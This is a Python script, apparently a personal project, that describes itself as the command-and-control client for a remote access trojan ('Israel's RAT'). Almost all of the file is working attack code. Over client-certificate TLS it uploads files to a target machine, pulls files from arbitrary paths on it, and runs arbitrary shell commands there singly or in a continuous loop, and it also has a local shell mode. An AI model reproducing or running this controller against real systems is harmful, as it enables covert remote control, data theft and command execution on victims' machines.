#!/usr/bin/python3

# Purpose: RAT C2. This script will speak with the target machine.
# Author: Israel Fernandez
# Date of creation: April 7, 2026

# Deliverables: Upload, Download, Execute

import requests
import base64
import shlex
import subprocess

BASE_URL = "https://localhost:8443"

# Trust the CA that signed the Target certificate.
CA_CERT = "ca.crt"

# Present the client certificate to the Target.
CLIENT_CERT = ("c2.crt", "c2.key")

SPLASH = "Welcome to Israel's RAT!"

# This is taken from https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def warn(msg):
    print(f"{bcolors.BOLD}{bcolors.WARNING}[*]{bcolors.ENDC} {msg}")

def err(msg):
    print(f"{bcolors.BOLD}{bcolors.FAIL}[!]{bcolors.ENDC} {msg}")

def success(msg):
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}[+]{bcolors.ENDC} {msg}")

def log(msg):
    print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")


def print_splash():
    horizontal_bar_len = (len(SPLASH)//2 + len(SPLASH))
    splash_spacing = ((len(SPLASH)//2)//2 - 1)
    print("-"*horizontal_bar_len)
    print("|" + " "*splash_spacing + SPLASH + " "*splash_spacing + "|")
    print("-"*horizontal_bar_len)
    print("")

def encode(msg):
    return base64.b64encode(msg).decode('utf-8')

def decode(msg):
    return base64.b64decode(msg)

def get_from_target(req):
    try:
        response = requests.get(
            f"{BASE_URL}/{req}",
            verify=CA_CERT,
            cert=CLIENT_CERT,
            timeout=10,
        )
        response.raise_for_status()  # raises for 4xx/5xx
        return response.json()

    except requests.exceptions.SSLError as e:
        err(f"SSL error: {e}")

    except requests.exceptions.ConnectionError as e:
        err(f"Connection failed: {e}")

    except requests.exceptions.Timeout:
        err(f"Request timed out")

    except requests.exceptions.HTTPError as e:
        err(f"HTTP error: {e}")

    except requests.exceptions.RequestException as e:
        # catch-all
        err(f"General request error: {e}")
    
    


def send_to_target(cmd, payload):
    try: 
        response = requests.post(
            f"{BASE_URL}/{cmd}",
            json=payload,
            verify=CA_CERT,
            cert=CLIENT_CERT,
            timeout=10,
        )
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        err(f"POST failed: {e}")


def upload(local_path):
    try:
        with open(local_path, 'rb+') as file:
            data = file.read()
        filename = local_path.split("/")[-1]
        log(f"Uploading {local_path} ({len(data)}) to Target: {BASE_URL}")
        response = send_to_target("upload", {"file": encode(data), "filename" : filename})
        if response["ok"]:
            success(f"Successfully uploaded {filename}!")
        else:
            err(f"Error! {response["error"]}")
            err(f"Details of Error: {response["details"]}")
    except OSError as e:
        err(f"Failed to read file: {e}")

def download(remote_path, local_path):
    filename = remote_path.split("/")[-1]
    if local_path == "":
        local_path = "./"
    log(f"Download request for {filename} from Target: {BASE_URL}")
    response = send_to_target("download", {"filepath": remote_path})
    if response["ok"]:
        try:
            data = decode(response["data"])
            with open(local_path + "/" + filename, 'wb+') as file:
                file.write(data)
            success(f"Successfully downloaded {filename} from Target: {BASE_URL}")
        except OSError as e:
            err(f"Failed to write to {local_path}: {e}")
    else:
        err(f"Error! {response["error"]}")
        err(f"Details of Error: {response["details"]}")

def execute(command_to_execute, mode):
    if mode == 0:
        log(f"Executing command: {command_to_execute} on {BASE_URL}")
    response = send_to_target("execute", {"command": command_to_execute})
    try:
        if response["ok"]:
            if mode == 0:
                success(f"Successfully ran command {command_to_execute} on Target: {BASE_URL}")
                success(f"Output: {response["output"]}")
            else:
                print(response["output"])
        else:
            err(f"Error! {response["error"]}")
            err(f"Details of Error: {response["details"]}")
    except TypeError as e:
        err(f"Error: {e}")


def execute_locally(payload):
    try:
        res = subprocess.run(payload, capture_output=True, text=True, shell=True)
        print(res.stdout + res.stderr)
    except OSError as e:
        err(f"Failed to execute {payload}: {e}")


def main():
    try:
        while True:
            print_splash()
            print("1. Download a file")
            print("2. Upload a file")
            print("3. Execute a command")
            print("4. Execute continuously")
            print("5. Execute locally")
            choice = int(input("Please pick a command:"))
            if choice == 1:
                try:
                    filename = input("Please enter the path to download: ")
                    local_path = input("Please enter the location you want the file stored.")
                    download(filename, local_path)
                except KeyboardInterrupt:
                    print()
            elif choice == 2:
                try:
                    filename = input("Name a file to upload: ")
                    upload(filename)
                except KeyboardInterrupt:
                    print()
            elif choice == 3:
                try:
                    command = input("Enter the command to run: ")
                    execute(command, 0)
                except KeyboardInterrupt:
                    print()
            elif choice == 4:
                try:
                    command = ""
                    print("Enter quit to stop.")
                    while command.lower() != "quit":
                        command = input(":")
                        if command.lower() != "quit":
                            execute(command, 1)
                except KeyboardInterrupt:
                    print()
            elif choice == 5:
                try:
                    command = ""
                    print("Executing locally. Enter quit to stop.")
                    while command.lower() != "quit":
                        command = input(":")
                        if command.lower() != "quit":
                            execute_locally(command)
                except KeyboardInterrupt:
                    print()
            else:
                print("Please try again")
                continue
    except KeyboardInterrupt:
        print()
        warn("Exited Successfully")

if __name__ == "__main__":
    main()

